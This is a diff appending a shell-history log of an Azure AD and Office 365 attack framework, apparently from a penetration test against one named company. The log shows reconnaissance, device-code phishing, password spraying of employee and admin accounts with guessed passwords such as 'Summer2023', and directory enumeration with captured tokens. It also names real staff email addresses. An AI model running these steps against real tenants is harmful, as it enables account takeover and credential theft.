@@ -14588,3 +14588,1669 @@
 
 # 2023-05-02 17:27:45.485610
 +exit
+
+# 2023-07-31 11:19:41.341844
++use module exploit/azuread_device_code_phish
+
+# 2023-07-31 11:19:42.572499
++options
+
+# 2023-07-31 11:21:30.512296
++run
+
+# 2023-07-31 11:29:37.003560
++use module reconnaissance/azure_service_dns_fuzzer
+
+# 2023-07-31 11:29:39.340906
++options
+
+# 2023-07-31 11:29:44.489602
++set basename xitaso
+
+# 2023-07-31 11:29:50.953857
++run
+
+# 2023-07-31 11:32:17.864225
++set basename xitaso.com
+
+# 2023-07-31 11:32:19.252817
++run
+
+# 2023-07-31 11:39:40.082520
++use module reconnaissance/azure_check_azure_usage
+
+# 2023-07-31 11:39:41.240541
++options
+
+# 2023-07-31 11:39:45.736469
++set DOMAIN xitaso.com
+
+# 2023-07-31 11:39:46.468263
++run
+
+# 2023-07-31 11:42:48.961866
++use module reconnaissance/azure_service_dns_fuzzer
+
+# 2023-07-31 11:42:52.322131
++set basename xitaso
+
+# 2023-07-31 11:42:59.958248
++run
+
+# 2023-07-31 11:43:08.757260
++options
+
+# 2023-07-31 11:43:15.271976
++set COUNTRY_CODE DE
+
+# 2023-07-31 11:43:24.445867
++set domain xitaso.com
+
+# 2023-07-31 11:43:25.312576
++run
+
+# 2023-07-31 11:43:30.919099
++unset COUNTRY_CODE
+
+# 2023-07-31 11:43:31.752183
++run
+
+# 2023-07-31 11:43:33.411228
++options
+
+# 2023-07-31 11:43:37.800601
++exit
+
+# 2023-07-31 11:43:44.241979
++use module reconnaissance/azure_service_dns_fuzzer
+
+# 2023-07-31 11:43:47.135950
++set domain xitaso.com
+
+# 2023-07-31 11:43:51.416326
++set basename xitaso
+
+# 2023-07-31 11:43:52.449577
++run
+
+# 2023-07-31 11:44:00.318669
++unset BASENAME
+
+# 2023-07-31 11:44:01.422043
++run
+
+# 2023-07-31 11:44:06.216350
++set COUNTRY_CODE DE
+
+# 2023-07-31 11:44:07.835377
++run
+
+# 2023-07-31 11:54:20.671345
++curl google.al
+
+# 2023-07-31 11:55:10.928207
++run
+
+# 2023-08-09 08:21:35.375693
++use module exploit/azuread_password_spray
+
+# 2023-08-09 08:21:36.149018
++options
+
+# 2023-08-09 08:22:18.678310
++set WORDLIST /home/glb/NewNebula/emails
+
+# 2023-08-09 08:22:26.990081
++set PASSWORD Xitaso@123
+
+# 2023-08-09 08:22:35.149130
++run
+
+# 2023-08-09 08:52:52.471880
++use module reconnaissance/azuread_unauth_user_enum
+
+# 2023-08-09 08:52:54.474056
++options
+
+# 2023-08-09 08:52:57.654092
++set WORDLIST /home/glb/NewNebula/emails
+
+# 2023-08-09 08:52:58.555012
++run
+
+# 2023-08-09 08:54:46.128561
++set WORDLIST /home/glb/NewNebula/xitasoEmails
+
+# 2023-08-09 08:54:47.066768
++run
+
+# 2023-08-09 08:55:05.870856
++ls
+
+# 2023-08-09 08:55:15.195339
++pwd
+
+# 2023-08-09 08:55:36.078723
++set WORDLIST /home/glb/NewNebula/xiasoEmails
+
+# 2023-08-09 08:55:37.612439
++run
+
+# 2023-08-09 08:56:21.055527
++use module exploit/azuread_password_spray
+
+# 2023-08-09 08:56:22.464875
++options
+
+# 2023-08-09 08:56:25.503459
++set WORDLIST /home/glb/NewNebula/xiasoEmails
+
+# 2023-08-09 08:56:26.997763
++run
+
+# 2023-08-09 09:03:24.322385
++use module reconnaissance/azuread_unauth_user_enum
+
+# 2023-08-09 09:03:25.416826
++options
+
+# 2023-08-09 09:03:29.279768
++unset WORDLIST
+
+# 2023-08-09 09:03:41.219595
++set EMAIL mike.kleber@xitaso.comr
+
+# 2023-08-09 09:03:43.120794
++set EMAIL mike.kleber@xitaso.com
+
+# 2023-08-09 09:03:45.525207
++run
+
+# 2023-08-09 09:03:54.507304
++use module exploit/azuread_password_spray
+
+# 2023-08-09 09:03:57.347030
++unset WORDLIST
+
+# 2023-08-09 09:03:59.469729
++set EMAIL mike.kleber@xitaso.com
+
+# 2023-08-09 09:04:00.883031
++options
+
+# 2023-08-09 09:04:02.807111
++run
+
+# 2023-08-10 08:11:31.545064
++use module reconnaissance/misc_crtsh
+
+# 2023-08-10 08:11:32.988452
++options
+
+# 2023-08-10 08:11:37.641563
++set DOMAIN xitaso.com
+
+# 2023-08-10 08:11:38.496100
++run
+
+# 2023-08-10 08:26:41.726600
++use module reconnaissance/azure_Ser
+
+# 2023-08-10 08:26:46.871085
++use module reconnaissance/azure_service_dns_fuzzer
+
+# 2023-08-10 08:26:48.287957
++options
+
+# 2023-08-10 08:29:20.314339
++set basename xitasogmbh
+
+# 2023-08-10 08:29:21.535046
++run
+
+# 2023-08-10 08:35:59.720800
++nslookup xitasogmbh-my.sharepoint.com
+
+# 2023-08-10 08:36:27.177889
++run
+
+# 2023-08-10 08:45:34.410689
++nslookup xitasogmbh.com
+
+# 2023-08-10 08:45:42.890245
++options
+
+# 2023-08-10 08:59:06.349114
++cd ..
+
+# 2023-08-10 08:59:06.811178
++ls
+
+# 2023-08-13 20:17:20.204800
++use module reconnaissance/azure_check_azure_usage
+
+# 2023-08-13 20:17:22.405257
++options
+
+# 2023-08-13 20:17:28.952496
++set DOMAIN xitaso.com
+
+# 2023-08-13 20:17:30.575070
++run
+
+# 2023-08-16 09:00:17.085187
++use module enum/azuread_enum_aad_objects
+
+# 2023-08-16 09:00:18.573670
++options
+
+# 2023-08-16 09:02:42.049796
++use module exploit/azuread_device_code_phish
+
+# 2023-08-16 09:02:43.008590
++options
+
+# 2023-08-16 09:03:08.595758
++set CLIENT-ID 1b730954-1685-4b74-9bfd-dac224a7b894
+
+# 2023-08-16 09:03:11.334129
++run
+
+# 2023-08-16 09:04:04.993700
++set azure-credentials xitaso
+
+# 2023-08-16 09:04:09.328564
++set azuread-credentials xitaso
+
+# 2023-08-16 09:04:23.894171
++run
+
+# 2023-08-16 09:08:00.962308
++use module exploit/azuread_device_code_phish
+
+# 2023-08-16 09:08:02.929678
++set CLIENT-ID 1b730954-1685-4b74-9bfd-dac224a7b894
+
+# 2023-08-16 09:08:06.461842
++run
+
+# 2023-08-16 09:09:39.899139
++options
+
+# 2023-08-16 09:09:58.105853
++set REFRESH true
+
+# 2023-08-16 09:09:59.000191
++run
+
+# 2023-08-16 09:10:09.033305
++show credentials
+
+# 2023-08-16 09:10:17.199744
++use credentials SaUmPJfYXP
+
+# 2023-08-16 09:10:23.509046
++use module enum/azuread_enum_aad_objects
+
+# 2023-08-16 09:10:24.762457
++run
+
+# 2023-08-16 09:11:49.426355
++use credentials SaUmPJfYXP
+
+# 2023-08-16 09:11:51.747987
++use module enum/azuread_enum_aad_objects
+
+# 2023-08-16 09:11:54.170063
++run
+
+# 2023-08-16 09:12:05.427459
++use credentials SaUmPJfYXP
+
+# 2023-08-16 09:12:08.483648
++use module enum/azuread_enum_aad_objects
+
+# 2023-08-16 09:12:09.892200
++run
+
+# 2023-08-16 09:13:00.018087
++use credentials SaUmPJfYXP
+
+# 2023-08-16 09:13:08.617306
++use module enum/office365_list_users
+
+# 2023-08-16 09:13:09.669200
++run
+
+# 2023-08-16 09:15:04.651830
++use module enum/office365_list_groups
+
+# 2023-08-16 09:15:05.766279
++run
+
+# 2023-08-16 09:19:26.417595
++use credentials SaUmPJfYXP
+
+# 2023-08-16 09:19:37.805669
++use module enum/azuread_enum_aad_objects
+
+# 2023-08-16 09:19:40.056241
++run
+
+# 2023-08-16 09:21:00.217461
++use credentials SaUmPJfYXP
+
+# 2023-08-16 09:21:01.560908
++use module enum/azuread_enum_aad_objects
+
+# 2023-08-16 09:21:02.759820
++run
+
+# 2023-08-16 09:22:48.903666
++use credentials SaUmPJfYXP
+
+# 2023-08-16 09:22:50.610973
++use module enum/azuread_enum_aad_objects
+
+# 2023-08-16 09:22:52.579900
++run
+
+# 2023-08-16 09:25:19.951002
++use module enum/azuread_enum_aad_objects
+
+# 2023-08-16 09:25:21.498952
++use credentials SaUmPJfYXP
+
+# 2023-08-16 09:25:22.730430
++run
+
+# 2023-08-16 09:25:44.785457
++use credentials SaUmPJfYXP
+
+# 2023-08-16 09:25:46.159746
++use module enum/azuread_enum_aad_objects
+
+# 2023-08-16 09:25:47.295737
++run
+
+# 2023-08-16 09:26:34.340873
++use module enum/azuread_enum_aad_objects
+
+# 2023-08-16 09:26:37.096199
++use credentials SaUmPJfYXP
+
+# 2023-08-16 09:26:38.556212
++run
+
+# 2023-08-16 09:28:45.720761
++use credentials SaUmPJfYXP
+
+# 2023-08-16 09:28:51.813565
++use module enum/office365_enum_aad_objects
+
+# 2023-08-16 09:28:54.236051
++run
+
+# 2023-08-16 09:31:15.631285
++use credentials SaUmPJfYXP
+
+# 2023-08-16 09:31:16.881335
++use module enum/office365_enum_aad_objects
+
+# 2023-08-16 09:31:18.080809
++run
+
+# 2023-08-16 09:32:10.428084
++use module enum/office365_enum_aad_objects
+
+# 2023-08-16 09:32:11.663589
++use credentials SaUmPJfYXP
+
+# 2023-08-16 09:32:12.736106
++run
+
+# 2023-08-16 09:35:03.329722
++use credentials SaUmPJfYXP
+
+# 2023-08-16 09:35:04.877697
++use module enum/office365_enum_aad_objects
+
+# 2023-08-16 09:35:06.248767
++run
+
+# 2023-08-16 09:37:53.012609
++use credentials SaUmPJfYXP
+
+# 2023-08-16 09:37:54.512467
++use module enum/office365_enum_aad_objects
+
+# 2023-08-16 09:37:57.444474
++run
+
+# 2023-08-16 09:38:27.866102
++use module enum/office365_enum_aad_objects
+
+# 2023-08-16 09:38:29.281842
++use credentials SaUmPJfYXP
+
+# 2023-08-16 09:38:30.760950
++run
+
+# 2023-08-16 09:39:11.649861
++use credentials SaUmPJfYXP
+
+# 2023-08-16 09:39:12.726691
++use module enum/office365_enum_aad_objects
+
+# 2023-08-16 09:39:13.749403
++run
+
+# 2023-08-16 09:42:00.113353
++use module enum/office365_enum_aad_objects
+
+# 2023-08-16 09:42:01.275051
++use credentials SaUmPJfYXP
+
+# 2023-08-16 09:42:02.421416
++run
+
+# 2023-08-16 09:45:18.484466
++use credentials SaUmPJfYXP
+
+# 2023-08-16 09:45:19.624951
++use module enum/office365_enum_aad_objects
+
+# 2023-08-16 09:45:20.682089
++run
+
+# 2023-08-16 09:45:58.966099
++use module enum/office365_enum_aad_objects
+
+# 2023-08-16 09:46:00.986264
++use credentials SaUmPJfYXP
+
+# 2023-08-16 09:46:02.863717
++run
+
+# 2023-08-16 09:47:09.388382
++use module enum/office365_enum_aad_objects
+
+# 2023-08-16 09:47:10.409612
++use credentials SaUmPJfYXP
+
+# 2023-08-16 09:47:11.561384
++run
+
+# 2023-08-16 09:48:12.963232
++use credentials SaUmPJfYXP
+
+# 2023-08-16 09:48:14.112011
++use module enum/office365_enum_aad_objects
+
+# 2023-08-16 09:48:15.286392
++run
+
+# 2023-08-16 09:51:59.193339
++use module enum/office365_enum_aad_objects
+
+# 2023-08-16 09:52:00.303230
++use credentials SaUmPJfYXP
+
+# 2023-08-16 09:52:01.508292
++run
+
+# 2023-08-16 09:53:07.012968
++use credentials SaUmPJfYXP
+
+# 2023-08-16 09:53:08.795755
++use module enum/office365_enum_aad_objects
+
+# 2023-08-16 09:53:09.824459
++run
+
+# 2023-08-16 09:55:58.321743
++use module enum/office365_enum_aad_objects
+
+# 2023-08-16 09:56:00.796066
++use credentials SaUmPJfYXP
+
+# 2023-08-16 09:56:01.795508
++run
+
+# 2023-08-16 10:00:32.648446
++use credentials SaUmPJfYXP
+
+# 2023-08-16 10:00:34.736189
++use module enum/office365_enum_aad_objects
+
+# 2023-08-16 10:00:36.242520
++run
+
+# 2023-08-16 10:08:18.595074
++use module enum/office365_enum_aad_objects
+
+# 2023-08-16 10:08:19.655155
++use credentials SaUmPJfYXP
+
+# 2023-08-16 10:08:20.885922
++run
+
+# 2023-08-16 10:12:20.635179
++use credentials SaUmPJfYXP
+
+# 2023-08-16 10:12:22.294907
++use module enum/office365_enum_aad_objects
+
+# 2023-08-16 10:12:23.358006
++run
+
+# 2023-08-16 10:18:29.405268
++use module enum/office365_enum_aad_objects
+
+# 2023-08-16 10:18:31.077836
++use credentials SaUmPJfYXP
+
+# 2023-08-16 10:18:32.108277
++run
+
+# 2023-08-16 10:41:41.287654
++use module enum/office365_enum_aad_objects
+
+# 2023-08-16 10:41:42.905167
++use credentials SaUmPJfYXP
+
+# 2023-08-16 10:41:44.397275
++run
+
+# 2023-08-16 10:42:18.349204
++use module exploit/azuread_device_code_phish
+
+# 2023-08-16 10:42:20.010022
++run
+
+# 2023-08-16 10:42:27.827375
++allInfo[1] = meInfo
++        allInfo[1]['InfoType'] = "UserInfo"
+
+# 2023-08-16 10:42:51.304184
++set REFRESH true
+
+# 2023-08-16 10:42:52.267076
++run
+
+# 2023-08-16 10:43:02.325159
++use credentials o8Z5uUWCVM
+
+# 2023-08-16 10:43:06.634129
++run
+
+# 2023-08-16 10:43:15.896423
++use module enum/office365_enum_aad_objects
+
+# 2023-08-16 10:43:17.118799
++run
+
+# 2023-08-16 10:43:41.532251
++use module enum/office365_enum_aad_objects
+
+# 2023-08-16 10:43:43.504897
++use credentials o8Z5uUWCVM
+
+# 2023-08-16 10:43:44.578707
++run
+
+# 2023-08-16 10:44:53.932105
++use credentials o8Z5uUWCVM
+
+# 2023-08-16 10:44:55.198437
++use module enum/office365_enum_aad_objects
+
+# 2023-08-16 10:44:56.654460
++run
+
+# 2023-08-16 10:47:17.116348
++use module enum/office365_enum_aad_objects
+
+# 2023-08-16 10:47:19.116915
++use credentials o8Z5uUWCVM
+
+# 2023-08-16 10:47:20.984890
++run
+
+# 2023-08-19 21:18:13.310856
++use module exploit/azuread_password_spray
+
+# 2023-08-19 21:18:14.088587
++options
+
+# 2023-08-19 21:18:54.812584
++set EMAIL admin@XITASOGmbH.onmicrosoft.com
+
+# 2023-08-19 21:19:01.927104
++set PASSWORD Summer2023
+
+# 2023-08-19 21:19:02.930784
++run
+
+# 2023-08-19 21:32:26.290066
++use module exploit/azuread_password_spray
+
+# 2023-08-19 21:32:28.142598
++set EMAIL admin@XITASOGmbH.onmicrosoft.com
+
+# 2023-08-19 21:32:55.342148
++set password-WORDLIST /home/glb/NewNebula/passes.txt
+
+# 2023-08-19 21:32:56.821795
++run
+
+# 2023-08-19 21:36:08.647919
++set password-WORDLIST /home/glb/NewNebula/passes.txt
+
+# 2023-08-19 21:36:10.161550
++use module exploit/azuread_password_spray
+
+# 2023-08-19 21:36:11.054532
++set password-WORDLIST /home/glb/NewNebula/passes.txt
+
+# 2023-08-19 21:36:12.917182
++set EMAIL admin@XITASOGmbH.onmicrosoft.com
+
+# 2023-08-19 21:36:14.360992
++run
+
+# 2023-08-19 21:36:29.588880
++options
+
+# 2023-08-19 21:39:21.697013
++use module exploit/azuread_password_spray
+
+# 2023-08-19 21:39:22.800314
++set EMAIL admin@XITASOGmbH.onmicrosoft.com
+
+# 2023-08-19 21:39:24.880328
++set password-WORDLIST /home/glb/NewNebula/passes.txt
+
+# 2023-08-19 21:39:25.880135
++run
+
+# 2023-08-19 21:40:15.630142
++use module exploit/azuread_password_spray
+
+# 2023-08-19 21:40:17.177065
++set password-WORDLIST /home/glb/NewNebula/passes.txt
+
+# 2023-08-19 21:40:18.510694
++set EMAIL admin@XITASOGmbH.onmicrosoft.com
+
+# 2023-08-19 21:40:19.756853
++run
+
+# 2023-08-19 22:23:45.486391
++use module reconnaissance/azure_check_azure_usage
+
+# 2023-08-19 22:23:46.287992
++options
+
+# 2023-08-19 22:23:50.098382
++set DOMAIN xitaso.com
+
+# 2023-08-19 22:23:52.011868
++run
+
+# 2023-08-20 10:34:15.668236
++set DOMAIN xitaso.com
+
+# 2023-08-20 10:34:17.614225
++use module reconnaissance/azure_check_azure_usage
+
+# 2023-08-20 10:34:21.421668
++use module exploit/azuread_password_spray
+
+# 2023-08-20 10:34:24.072031
++set EMAIL admin@XITASOGmbH.onmicrosoft.com
+
+# 2023-08-20 10:34:27.665201
++set password-WORDLIST /home/glb/NewNebula/passes.txt
+
+# 2023-08-20 10:35:14.806486
++run
+
+# 2023-08-20 10:37:07.117365
++set EMAIL pen.tester@xitaso.com
+
+# 2023-08-20 10:38:08.451241
++options
+
+# 2023-08-20 10:38:11.877518
++run
+
+# 2023-08-20 10:38:43.629777
++set EMAIL admin@XITASOGmbH.onmicrosoft.com
+
+# 2023-08-20 10:38:49.667744
++set EMAIL admin@XITASO.com
+
+# 2023-08-20 10:38:51.277799
++run
+
+# 2023-08-20 10:39:07.013137
++set EMAIL admin@XITASOGmbH.onmicrosoft.com
+
+# 2023-08-20 10:39:08.629133
++run
+
+# 2023-08-20 10:52:42.672794
++use module enum/office365_enum_aad_objects
+
+# 2023-08-20 10:52:44.343146
++options
+
+# 2023-08-20 10:53:00.550444
++show credentials
+
+# 2023-08-20 10:53:11.197197
++set azuread-credentials
+
+# 2023-08-20 10:53:19.094550
++set azuread-credentials pen.tester
+
+# 2023-08-20 10:53:22.584002
++set azure-credentials pen.tester
+
+# 2023-08-20 10:53:43.551607
++use module exploit/azuread_device_code_phish
+
+# 2023-08-20 10:53:44.975345
++options
+
+# 2023-08-20 10:53:49.791146
++run
+
+# 2023-08-20 10:55:07.354564
++set CLIENT-ID 1b730954-1685-4b74-9bfd-dac224a7b894
+
+# 2023-08-20 10:55:08.154541
++run
+
+# 2023-08-20 10:55:31.592049
++set REFRESH true
+
+# 2023-08-20 10:55:33.004619
++run
+
+# 2023-08-20 10:55:49.985893
++use credentials 1M66XSSI5m
+
+# 2023-08-20 10:55:55.938132
++use module exploit/azuread_device_code_phish
+
+# 2023-08-20 10:56:01.564787
++use module enum/office365_enum_aad_objects
+
+# 2023-08-20 10:56:02.709600
++run
+
+# 2023-08-20 11:04:31.421816
++use credentials 1M66XSSI5m
+
+# 2023-08-20 11:05:30.266128
++use module enum/office365_get_user_list
+
+# 2023-08-20 11:05:31.419415
++options
+
+# 2023-08-20 11:05:33.417297
++run
+
+# 2023-08-20 12:03:35.698323
++use module enum/office365_get_user_list
+
+# 2023-08-20 12:03:37.404661
++use credentials 1M66XSSI5m
+
+# 2023-08-20 12:03:38.798765
++run
+
+# 2023-08-20 12:09:04.402895
++use credentials 1M66XSSI5m
+
+# 2023-08-20 12:09:05.662585
++use module enum/office365_get_user_list
+
+# 2023-08-20 12:09:07.424029
++run
+
+# 2023-08-20 12:09:41.917204
++use module enum/office365_get_user_list
+
+# 2023-08-20 12:09:42.962856
++use credentials 1M66XSSI5m
+
+# 2023-08-20 12:09:43.696329
++run
+
+# 2023-08-20 12:14:14.919288
++use credentials 1M66XSSI5m
+
+# 2023-08-20 12:14:16.179839
++use module enum/office365_get_user_list
+
+# 2023-08-20 12:14:17.201958
++run
+
+# 2023-08-20 12:18:08.858645
++use module enum/office365_get_user_list
+
+# 2023-08-20 12:18:09.602807
++run
+
+# 2023-08-20 12:20:45.321519
++use module enum/office365_get_user_list
+
+# 2023-08-20 12:20:46.227028
++run
+
+# 2023-08-20 12:21:09.320017
++use module enum/office365_get_user_list
+
+# 2023-08-20 12:21:15.090215
++use credentials 1M66XSSI5m
+
+# 2023-08-20 12:21:15.984306
++run
+
+# 2023-08-20 12:25:17.553773
++use module exploit/azuread_password_spray
+
+# 2023-08-20 12:25:18.867198
++options
+
+# 2023-08-20 12:25:46.164261
++set password-WORDLIST /home/glb/NewNebula/passes.txt
+
+# 2023-08-20 12:25:59.105232
++set WORDLIST /home/glb/NewNebula/emails
+
+# 2023-08-20 12:26:00.286743
++run
+
+# 2023-08-20 12:27:28.570294
++use module exploit/azuread_password_spray
+
+# 2023-08-20 12:27:29.580358
++set WORDLIST /home/glb/NewNebula/emails
+
+# 2023-08-20 12:27:31.097103
++set password-WORDLIST /home/glb/NewNebula/passes.txt
+
+# 2023-08-20 12:27:41.467973
++options
+
+# 2023-08-20 12:27:42.931278
++run
+
+# 2023-08-20 13:07:29.579302
++use module exploit/azuread_password_spray
+
+# 2023-08-20 13:07:30.702382
++set password-WORDLIST /home/glb/NewNebula/passes.txt
+
+# 2023-08-20 13:07:32.077417
++set WORDLIST /home/glb/NewNebula/emails
+
+# 2023-08-20 13:07:32.935841
++run
+
+# 2023-08-20 13:24:12.183210
++use module exploit/azuread_password_spray
+
+# 2023-08-20 13:24:15.876501
++set WORDLIST /home/glb/NewNebula/xitasoEmails
+
+# 2023-08-20 13:24:18.292205
++set password-WORDLIST /home/glb/NewNebula/passes.txt
+
+# 2023-08-20 13:24:20.399356
++run
+
+# 2023-08-20 13:49:07.736811
++cat emails | grep mike
+
+# 2023-08-20 14:05:57.211816
++use module exploit/azuread_password_spray
+
+# 2023-08-20 14:05:58.620083
++set password-WORDLIST /home/glb/NewNebula/passes.txt
+
+# 2023-08-20 14:06:00.364379
++set WORDLIST /home/glb/NewNebula/xitasoEmails
+
+# 2023-08-20 14:06:23.084074
++run
+
+# 2023-08-20 14:20:22.723102
++use module exploit/azuread_password_spray
+
+# 2023-08-20 14:20:23.645320
++set WORDLIST /home/glb/NewNebula/xitasoEmails
+
+# 2023-08-20 14:20:24.842098
++set password-WORDLIST /home/glb/NewNebula/passes.txt
+
+# 2023-08-20 14:20:25.787759
++run
+
+# 2023-08-20 14:23:29.617860
++use module exploit/azuread_password_spray
+
+# 2023-08-20 14:23:30.567313
++set password-WORDLIST /home/glb/NewNebula/passes.txt
+
+# 2023-08-20 14:23:31.845833
++set WORDLIST /home/glb/NewNebula/xitasoEmails
+
+# 2023-08-20 14:23:32.891314
++run
+
+# 2023-08-20 14:27:22.861882
++use module exploit/azuread_password_spray
+
+# 2023-08-20 14:27:23.861708
++set WORDLIST /home/glb/NewNebula/xitasoEmails
+
+# 2023-08-20 14:27:25.009881
++set password-WORDLIST /home/glb/NewNebula/passes.txt
+
+# 2023-08-20 14:27:25.907109
++run
+
+# 2023-08-20 14:39:17.393080
++use module exploit/azuread_password_spray
+
+# 2023-08-20 14:39:19.185878
++set WORDLIST /home/glb/NewNebula/xitasoEmails
+
+# 2023-08-20 14:39:21.353349
++set password-WORDLIST /home/glb/NewNebula/passes.txt
+
+# 2023-08-20 14:39:22.407968
++run
+
+# 2023-08-20 14:49:41.344971
++use module exploit/azuread_password_spray
+
+# 2023-08-20 14:49:42.217023
++set password-WORDLIST /home/glb/NewNebula/passes.txt
+
+# 2023-08-20 14:49:43.421339
++set WORDLIST /home/glb/NewNebula/xitasoEmails
+
+# 2023-08-20 14:49:44.602456
++run
+
+# 2023-08-21 09:10:12.012535
++show credentials
+
+# 2023-08-21 09:10:17.731356
++use credentials 1M66XSSI5m
+
+# 2023-08-21 09:10:31.065474
++use module enum/office365_enum_aad_objects
+
+# 2023-08-21 09:10:32.339931
++options
+
+# 2023-08-21 09:10:36.095610
++set AADOBJECT users
+
+# 2023-08-21 09:10:40.654692
++set AADOBJECT me
+
+# 2023-08-21 09:10:42.416592
++run
+
+# 2023-08-21 09:11:37.677425
++use credentials 1M66XSSI5m
+
+# 2023-08-21 09:11:39.219680
++use module enum/office365_enum_aad_objects
+
+# 2023-08-21 09:11:40.411830
++set AADOBJECT me
+
+# 2023-08-21 09:11:41.697754
++run
+
+# 2023-08-21 09:12:17.875137
++use credentials 1M66XSSI5m
+
+# 2023-08-21 09:12:18.888225
++use module enum/office365_enum_aad_objects
+
+# 2023-08-21 09:12:22.279356
++set AADOBJECT me
+
+# 2023-08-21 09:12:23.627253
++run
+
+# 2023-08-21 09:12:51.108503
++use credentials 1M66XSSI5m
+
+# 2023-08-21 09:12:52.196853
++use module enum/office365_enum_aad_objects
+
+# 2023-08-21 09:12:53.386127
++set AADOBJECT me
+
+# 2023-08-21 09:12:54.739780
++run
+
+# 2023-08-21 09:13:45.438151
++use module enum/office365_enum_aad_objects
+
+# 2023-08-21 09:13:46.658574
++set AADOBJECT me
+
+# 2023-08-21 09:13:48.357506
++use credentials 1M66XSSI5m
+
+# 2023-08-21 09:13:50.950986
++run
+
+# 2023-08-21 09:14:16.933627
++remove credentials 1M66XSSI5m
+
+# 2023-08-21 09:14:19.364405
++show credentials
+
+# 2023-08-21 09:14:31.573479
++use module exploit/azuread_device_code_phish
+
+# 2023-08-21 09:14:33.212092
++run
+
+# 2023-08-21 09:15:14.792386
++set REFRESH true
+
+# 2023-08-21 09:15:17.203701
++run
+
+# 2023-08-21 09:15:28.686984
++remove credentials 5DIcjqCNmW
+
+# 2023-08-21 09:15:33.801279
++use module enum/office365_enum_aad_objects
+
+# 2023-08-21 09:15:34.706891
++options
+
+# 2023-08-21 09:15:36.279836
++run
+
+# 2023-08-21 09:16:03.021305
++use credentials 5DIcjqCNmW
+
+# 2023-08-21 09:16:04.524364
++run
+
+# 2023-08-21 10:08:31.910012
++use module exploit/azuread_device_code_phish
+
+# 2023-08-21 10:08:33.203813
++options
+
+# 2023-08-21 10:08:52.455910
++set CLIENT-ID 1b730954-1685-4b74-9bfd-dac224a7b894
+
+# 2023-08-21 10:08:53.529335
++run
+
+# 2023-08-21 10:09:23.409232
++set REFRESH true
+
+# 2023-08-21 10:09:25.440404
++run
+
+# 2023-08-21 10:09:34.028808
++use credentials XgbQqK7934
+
+# 2023-08-21 10:09:38.218605
++use module enum/office365_enum_aad_objects
+
+# 2023-08-21 10:09:39.663902
++options
+
+# 2023-08-21 10:09:43.446797
++set AADOBJECT me
+
+# 2023-08-21 10:09:44.125664
++run
+
+# 2023-08-21 10:10:10.338817
++use credentials XgbQqK7934
+
+# 2023-08-21 10:10:11.728097
++use module enum/office365_enum_aad_objects
+
+# 2023-08-21 10:10:13.655675
++set AADOBJECT me
+
+# 2023-08-21 10:10:14.586407
++run
+
+# 2023-08-21 10:11:08.367287
++use module enum/office365_enum_admin_Users
+
+# 2023-08-21 10:11:09.878950
++options
+
+# 2023-08-21 10:11:10.916582
++run
+
+# 2023-08-21 10:20:34.397831
++use credentials XgbQqK7934
+
+# 2023-08-21 10:20:43.806560
++use module enum/office365_find_groups_with_dynamic_membership
+
+# 2023-08-21 10:20:46.189023
++run
+
+# 2023-08-21 10:22:45.651117
++use credentials XgbQqK7934
+
+# 2023-08-21 10:22:46.542740
++use module enum/office365_find_groups_with_dynamic_membership
+
+# 2023-08-21 10:22:47.754820
++run
+
+# 2023-08-21 10:25:29.560163
++use credentials XgbQqK7934
+
+# 2023-08-21 10:25:30.822507
++use module enum/office365_find_groups_with_dynamic_membership
+
+# 2023-08-21 10:25:31.858179
++run
+
+# 2023-08-21 10:26:56.531889
++use module enum/office365_find_groups_with_dynamic_membership
+
+# 2023-08-21 10:27:01.391732
++use credentials XgbQqK7934
+
+# 2023-08-21 10:27:02.642657
++run
+
+# 2023-08-21 10:27:42.283293
++use credentials XgbQqK7934
+
+# 2023-08-21 10:27:43.769621
++use module enum/office365_find_groups_with_dynamic_membership
+
+# 2023-08-21 10:27:44.785667
++run
+
+# 2023-08-21 10:28:35.562037
++use module enum/office365_find_groups_with_dynamic_membership
+
+# 2023-08-21 10:28:37.826399
++use credentials XgbQqK7934
+
+# 2023-08-21 10:28:39.035003
++run
+
+# 2023-08-21 10:30:49.131852
++use credentials XgbQqK7934
+
+# 2023-08-21 10:30:50.170298
++use module enum/office365_find_groups_with_dynamic_membership
+
+# 2023-08-21 10:30:51.081722
++run
+
+# 2023-08-21 10:32:00.542180
++use module enum/office365_find_groups_with_dynamic_membership
+
+# 2023-08-21 10:32:01.546921
++use credentials XgbQqK7934
+
+# 2023-08-21 10:32:02.644303
++run
+
+# 2023-08-21 10:35:10.038044
++use credentials XgbQqK7934
+
+# 2023-08-21 10:35:10.922525
++use module enum/office365_find_groups_with_dynamic_membership
+
+# 2023-08-21 10:35:11.759552
++run
+
+# 2023-08-21 10:36:10.330497
++use module enum/office365_find_groups_with_dynamic_membership
+
+# 2023-08-21 10:36:11.823175
++use credentials XgbQqK7934
+
+# 2023-08-21 10:36:13.320289
++run
+
+# 2023-08-21 10:37:18.168367
++use credentials XgbQqK7934
+
+# 2023-08-21 10:37:19.075330
++use module enum/office365_find_groups_with_dynamic_membership
+
+# 2023-08-21 10:37:20.246637
++run
+
+# 2023-08-21 10:38:18.145318
++use module enum/office365_find_groups_with_dynamic_membership
+
+# 2023-08-21 10:38:20.366810
++use credentials XgbQqK7934
+
+# 2023-08-21 10:38:21.473487
++run
+
+# 2023-08-21 10:43:37.330286
++use credentials XgbQqK7934
+
+# 2023-08-21 10:43:38.685541
++use module enum/office365_find_groups_with_dynamic_membership
+
+# 2023-08-21 10:43:40.088618
++run
+
+# 2023-08-21 10:58:52.665646
++use module enum/office365_find_groups_with_dynamic_membership
+
+# 2023-08-21 10:58:53.631789
++use credentials XgbQqK7934
+
+# 2023-08-21 10:58:54.636419
++run
+
+# 2023-08-21 11:01:36.418975
++use credentials XgbQqK7934
+
+# 2023-08-21 11:01:38.264975
++use module enum/office365_find_groups_with_dynamic_membership
+
+# 2023-08-21 11:01:39.343696
++run
+
+# 2023-08-21 11:08:59.988254
++use credentials XgbQqK7934
+
+# 2023-08-21 11:09:00.880312
++use module enum/office365_find_groups_with_dynamic_membership
+
+# 2023-08-21 11:09:02.104335
++run
+
+# 2023-08-21 11:09:56.171419
++use module enum/office365_find_groups_with_dynamic_membership
+
+# 2023-08-21 11:09:58.227572
++use credentials XgbQqK7934
+
+# 2023-08-21 11:09:59.362017
++run
+
+# 2023-08-21 11:28:28.122128
++use module enum/office365_enum_aad_objects
+
+# 2023-08-21 11:28:29.234027
++run
+
+# 2023-08-21 11:28:44.610318
++show current-creds
+
+# 2023-08-21 11:28:49.535297
++use credentials XgbQqK7934
+
+# 2023-08-21 11:28:51.125276
++use module enum/office365_enum_aad_objects
+
+# 2023-08-21 11:28:53.150291
++run
+
+# 2023-08-21 11:29:02.471746
++set AADOBJECT me
+
+# 2023-08-21 11:29:03.113199
++run
+
